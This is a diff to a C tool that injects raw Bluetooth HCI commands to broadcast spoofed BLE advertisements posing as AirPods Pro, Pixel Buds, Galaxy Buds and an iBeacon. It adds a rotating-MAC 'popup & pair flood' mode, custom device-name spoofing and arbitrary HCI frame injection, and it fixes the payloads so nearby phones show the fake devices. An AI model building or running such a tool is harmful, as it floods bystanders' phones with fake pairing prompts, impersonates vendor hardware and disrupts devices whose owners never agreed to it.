@@ -34,40 +34,42 @@ static int send_hci_cmd(int fd, const uint8_t *cmd, size_t len, uint8_t *resp, s
     return (int)n;
 }
 
-// Pre-crafted BLE Advertising Payloads
-// 1. Apple AirDrop / iOS Proximity Popup (AirPods Pro setup popup)
+// Pre-crafted BLE Advertising Payloads (Max 31 bytes total)
+// 1. Apple AirPods Pro (Flags + Complete Local Name + Apple Proximity Pairing)
 static const uint8_t APPLE_AIRPODS_PRO[] = {
-    0x1E, // Length = 30 bytes
-    0xFF, // AD Type: Manufacturer Specific
-    0x4C, 0x00, // Apple Inc. (0x004C)
-    0x07, 0x19, // Type: Proximity Pairing, Len: 25
-    0x01,       // Prefix
-    0x0E, 0x20, // Model: AirPods Pro (0x0E20)
-    0x55,       // Status flags
-    0x55,       // Battery levels (left/right/case)
-    0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    // Flags: LE General Discoverable, BR/EDR Not Supported (3 bytes)
+    0x02, 0x01, 0x06,
+    // Complete Local Name: "AirPods Pro" (13 bytes)
+    0x0C, 0x09, 'A', 'i', 'r', 'P', 'o', 'd', 's', ' ', 'P', 'r', 'o',
+    // Apple Continuity Proximity Pairing (15 bytes)
+    0x0E, 0xFF, 0x4C, 0x00, 0x07, 0x09, 0x01, 0x0E, 0x20, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00
 };
 
-// 2. Google Fast Pair Notification
+// 2. Google Fast Pair Device (Flags + Complete Local Name + Fast Pair UUID 0xFE2C + Model ID)
 static const uint8_t GOOGLE_FAST_PAIR[] = {
-    0x06, // Length = 6 bytes
-    0x16, // AD Type: Service Data - 16-bit UUID
-    0x2C, 0xFE, // Fast Pair UUID (0xFE2C)
-    0xCD, 0x82, 0x54 // Model ID (e.g. Pixel Buds Pro / Google Device)
+    // Flags (3 bytes)
+    0x02, 0x01, 0x06,
+    // Complete Local Name: "Pixel Buds" (12 bytes)
+    0x0B, 0x09, 'P', 'i', 'x', 'e', 'l', ' ', 'B', 'u', 'd', 's',
+    // Service UUID 16-bit (4 bytes)
+    0x03, 0x03, 0x2C, 0xFE,
+    // Service Data: Fast Pair 0xFE2C + Model ID (7 bytes)
+    0x06, 0x16, 0x2C, 0xFE, 0x2C, 0x00, 0x00
 };
 
-// 3. Samsung Galaxy Buds Popup
+// 3. Samsung Galaxy Buds (Flags + Complete Local Name + Samsung Manufacturer Data)
 static const uint8_t SAMSUNG_BUDS[] = {
-    0x18, // Length = 24 bytes
-    0xFF, // AD Type: Manufacturer Specific
-    0x75, 0x00, // Samsung Electronics (0x0075)
-    0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
-    0x2E, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    // Flags (3 bytes)
+    0x02, 0x01, 0x06,
+    // Complete Local Name: "Galaxy Buds" (13 bytes)
+    0x0C, 0x09, 'G', 'a', 'l', 'a', 'x', 'y', ' ', 'B', 'u', 'd', 's',
+    // Samsung Electronics Manufacturer Specific Data (14 bytes)
+    0x0D, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00
 };
 
-// 4. Custom iBeacon (UUID: E2C56DB5-DFFB-48D2-B060-D0F5A71096E0, Major: 1, Minor: 1)
+// 4. Custom iBeacon (Flags + iBeacon Payload)
 static const uint8_t IBEACON_PAYLOAD[] = {
+    0x02, 0x01, 0x06,
     0x1A, // Length = 26 bytes
     0xFF, // Manufacturer Specific
     0x4C, 0x00, // Apple Inc
@@ -90,15 +92,16 @@ static void show_help(const char *prog) {
     print_banner();
     printf("Usage: %s [mode] [options]\n\n", prog);
     printf("Modes:\n");
-    printf("  --airpods         Broadcast Apple AirPods Pro pairing prompt\n");
-    printf("  --fastpair        Broadcast Google Fast Pair device announcement\n");
-    printf("  --samsung         Broadcast Samsung Galaxy Buds pairing notification\n");
+    printf("  --airpods         Broadcast Apple AirPods Pro (Flags + Name + Proximity)\n");
+    printf("  --fastpair        Broadcast Google Fast Pair (Flags + 'Pixel Buds' + 0xFE2C)\n");
+    printf("  --samsung         Broadcast Samsung Galaxy Buds (Flags + Name + Buds data)\n");
     printf("  --ibeacon         Broadcast standard Apple iBeacon advertisement\n");
+    printf("  --name <str>      Broadcast custom device name in pairing list\n");
     printf("  --custom <hex>    Inject arbitrary raw HCI command frame in hex\n");
-    printf("  --spam            Continuous rotating multi-vector BLE popup flood\n\n");
+    printf("  --spam            Continuous rotating multi-vector BLE popup & pair flood\n\n");
     printf("Options:\n");
     printf("  -i, --interval    Beacon transmission interval in ms (default: 50)\n");
-    printf("  -d, --duration    Duration in seconds (default: 10, 0 = infinite)\n");
+    printf("  -d, --duration    Duration in seconds (default: 15, 0 = infinite)\n");
     printf("  -h, --help        Show this help message\n\n");
 }
 
@@ -117,7 +120,11 @@ static void set_random_mac(int fd, uint8_t *resp) {
 }
 
 static void inject_adv_data(int fd, const uint8_t *ad, size_t ad_len, uint8_t *resp) {
-    // 1. LE_Set_Advertising_Parameters: OpCode 0x2006 (interval=32 = 20ms, non-connectable/connectable undirected)
+    // 0. Disable Advertising before changing parameters (avoids 0x0C Command Disallowed)
+    uint8_t cmd_disable[] = { 0x01, 0x0a, 0x20, 0x01, 0x00 };
+    send_hci_cmd(fd, cmd_disable, sizeof(cmd_disable), resp, 64);
+
+    // 1. LE_Set_Advertising_Parameters: OpCode 0x2006 (interval=32 = 20ms, ADV_IND)
     uint8_t cmd_param[] = {
         0x01, 0x06, 0x20, 0x0F,
         0x20, 0x00, // Min Interval: 0x0020 (20ms)
@@ -137,8 +144,8 @@ static void inject_adv_data(int fd, const uint8_t *ad, size_t ad_len, uint8_t *r
     cmd_data[1] = 0x08;
     cmd_data[2] = 0x20;
     cmd_data[3] = 0x20; // 32 bytes parameter length
-    cmd_data[4] = (uint8_t)ad_len;
     if (ad_len > 31) ad_len = 31;
+    cmd_data[4] = (uint8_t)ad_len;
     memcpy(&cmd_data[5], ad, ad_len);
     send_hci_cmd(fd, cmd_data, sizeof(cmd_data), resp, 64);
 
@@ -153,10 +160,11 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    int mode = 0; // 1=airpods, 2=fastpair, 3=samsung, 4=ibeacon, 5=custom, 6=spam
+    int mode = 0; // 1=airpods, 2=fastpair, 3=samsung, 4=ibeacon, 5=custom, 6=spam, 7=name
     int interval_ms = 50;
-    int duration_sec = 10;
+    int duration_sec = 15;
     const char *custom_hex = NULL;
+    const char *dev_name = NULL;
 
     for (int i = 1; i < argc; i++) {
         if (!strcmp(argv[i], "--airpods")) mode = 1;
@@ -164,6 +172,7 @@ int main(int argc, char **argv) {
         else if (!strcmp(argv[i], "--samsung")) mode = 3;
         else if (!strcmp(argv[i], "--ibeacon")) mode = 4;
         else if (!strcmp(argv[i], "--spam")) mode = 6;
+        else if (!strcmp(argv[i], "--name") && i + 1 < argc) { mode = 7; dev_name = argv[++i]; }
         else if (!strcmp(argv[i], "--custom") && i + 1 < argc) { mode = 5; custom_hex = argv[++i]; }
         else if (!strcmp(argv[i], "-i") && i + 1 < argc) interval_ms = atoi(argv[++i]);
         else if (!strcmp(argv[i], "-d") && i + 1 < argc) duration_sec = atoi(argv[++i]);
@@ -213,8 +222,9 @@ int main(int argc, char **argv) {
             printf("\n");
         }
         free(raw_pkt);
-    } else {
-        printf("[*] Starting Hardware BLE Beacon Ingestion Engine...\n");
+    } else if (mode == 6) {
+        // Multi-vector flood (rotates MAC every burst)
+        printf("[*] Starting Multi-Vector BLE Popup Flood Engine...\n");
         printf("[*] Burst Interval: %d ms | Duration: %d seconds\n\n", interval_ms, duration_sec);
 
         time_t start_time = time(NULL);
@@ -225,38 +235,70 @@ int main(int argc, char **argv) {
 
             set_random_mac(fd, rx_buf);
 
-            switch (mode) {
-                case 1:
-                    inject_adv_data(fd, APPLE_AIRPODS_PRO, sizeof(APPLE_AIRPODS_PRO), rx_buf);
-                    printf("\r\033[1;32m[TX #%llu]\033[0m Apple AirPods Pro Pairing Prompt Broadcasted ", (unsigned long long)++tx_bursts);
-                    break;
-                case 2:
-                    inject_adv_data(fd, GOOGLE_FAST_PAIR, sizeof(GOOGLE_FAST_PAIR), rx_buf);
-                    printf("\r\033[1;34m[TX #%llu]\033[0m Google Fast Pair Device Broadcasted ", (unsigned long long)++tx_bursts);
-                    break;
-                case 3:
-                    inject_adv_data(fd, SAMSUNG_BUDS, sizeof(SAMSUNG_BUDS), rx_buf);
-                    printf("\r\033[1;36m[TX #%llu]\033[0m Samsung Galaxy Buds Broadcasted ", (unsigned long long)++tx_bursts);
-                    break;
-                case 4:
-                    inject_adv_data(fd, IBEACON_PAYLOAD, sizeof(IBEACON_PAYLOAD), rx_buf);
-                    printf("\r\033[1;33m[TX #%llu]\033[0m Apple iBeacon Advertisement Broadcasted ", (unsigned long long)++tx_bursts);
-                    break;
-                case 6: {
-                    int sub = (tx_bursts % 4) + 1;
-                    if (sub == 1) inject_adv_data(fd, APPLE_AIRPODS_PRO, sizeof(APPLE_AIRPODS_PRO), rx_buf);
-                    else if (sub == 2) inject_adv_data(fd, GOOGLE_FAST_PAIR, sizeof(GOOGLE_FAST_PAIR), rx_buf);
-                    else if (sub == 3) inject_adv_data(fd, SAMSUNG_BUDS, sizeof(SAMSUNG_BUDS), rx_buf);
-                    else inject_adv_data(fd, IBEACON_PAYLOAD, sizeof(IBEACON_PAYLOAD), rx_buf);
-                    printf("\r\033[1;31m[MULTI-VECTOR #%llu]\033[0m Dispatched Rotating BLE Vector (%s) ", 
-                        (unsigned long long)++tx_bursts, sub==1?"Apple":sub==2?"Google":sub==3?"Samsung":"iBeacon");
-                    break;
-                }
-            }
+            int sub = (tx_bursts % 4) + 1;
+            if (sub == 1) inject_adv_data(fd, APPLE_AIRPODS_PRO, sizeof(APPLE_AIRPODS_PRO), rx_buf);
+            else if (sub == 2) inject_adv_data(fd, GOOGLE_FAST_PAIR, sizeof(GOOGLE_FAST_PAIR), rx_buf);
+            else if (sub == 3) inject_adv_data(fd, SAMSUNG_BUDS, sizeof(SAMSUNG_BUDS), rx_buf);
+            else inject_adv_data(fd, IBEACON_PAYLOAD, sizeof(IBEACON_PAYLOAD), rx_buf);
+
+            printf("\r\033[1;31m[MULTI-VECTOR #%llu]\033[0m Dispatched Rotating BLE Vector (%s) ", 
+                (unsigned long long)++tx_bursts, sub==1?"Apple AirPods":sub==2?"Pixel Buds":sub==3?"Galaxy Buds":"iBeacon");
             fflush(stdout);
             usleep(interval_ms * 1000);
         }
-        printf("\n\n\033[1;32m[✓] Injection complete! Total bursts dispatched: %llu\033[0m\n", (unsigned long long)tx_bursts);
+        printf("\n\n\033[1;32m[✓] Flood complete! Total bursts dispatched: %llu\033[0m\n", (unsigned long long)tx_bursts);
+    } else {
+        // Persistent Beacon Mode (Holds fixed MAC so scanning phones can discover and list the device)
+        set_random_mac(fd, rx_buf);
+
+        const uint8_t *payload = NULL;
+        size_t plen = 0;
+        uint8_t custom_name_buf[32];
+
+        if (mode == 1) {
+            payload = APPLE_AIRPODS_PRO;
+            plen = sizeof(APPLE_AIRPODS_PRO);
+            printf("[*] Mode: Apple AirPods Pro (Flags + 'AirPods Pro' + Proximity Pairing)\n");
+        } else if (mode == 2) {
+            payload = GOOGLE_FAST_PAIR;
+            plen = sizeof(GOOGLE_FAST_PAIR);
+            printf("[*] Mode: Google Fast Pair (Flags + 'Pixel Buds' + Fast Pair UUID 0xFE2C)\n");
+        } else if (mode == 3) {
+            payload = SAMSUNG_BUDS;
+            plen = sizeof(SAMSUNG_BUDS);
+            printf("[*] Mode: Samsung Galaxy Buds (Flags + 'Galaxy Buds' + Buds Data)\n");
+        } else if (mode == 4) {
+            payload = IBEACON_PAYLOAD;
+            plen = sizeof(IBEACON_PAYLOAD);
+            printf("[*] Mode: Apple iBeacon Advertisement\n");
+        } else if (mode == 7) {
+            // Build custom name payload
+            // Flags (3 bytes) + Complete Local Name (len + 1)
+            size_t nlen = strlen(dev_name);
+            if (nlen > 26) nlen = 26; // max 31 - 3 (flags) - 2 (name header) = 26
+            custom_name_buf[0] = 0x02; custom_name_buf[1] = 0x01; custom_name_buf[2] = 0x06;
+            custom_name_buf[3] = (uint8_t)(nlen + 1);
+            custom_name_buf[4] = 0x09; // Complete Local Name
+            memcpy(&custom_name_buf[5], dev_name, nlen);
+            payload = custom_name_buf;
+            plen = 3 + 2 + nlen;
+            printf("[*] Mode: Custom Device Name ('%s')\n", dev_name);
+        }
+
+        inject_adv_data(fd, payload, plen, rx_buf);
+        printf("\033[1;32m[+] Beacon active on RF channels 37, 38, 39!\033[0m\n");
+        printf("[*] Target duration: %d seconds (Press Ctrl+C to stop)\n", duration_sec);
+        printf("[*] Open Bluetooth on your phone and tap 'Pair new device' or refresh!\n\n");
+
+        time_t start_time = time(NULL);
+        while (g_running) {
+            int elapsed = (int)(time(NULL) - start_time);
+            if (duration_sec > 0 && elapsed >= duration_sec) break;
+            printf("\r\033[1;36m[TX ON AIR]\033[0m Broadcasting... Elapsed: %d/%ds ", elapsed, duration_sec);
+            fflush(stdout);
+            sleep(1);
+        }
+        printf("\n\n\033[1;32m[✓] Broadcast finished.\033[0m\n");
     }
 
     // Stop advertising & reset
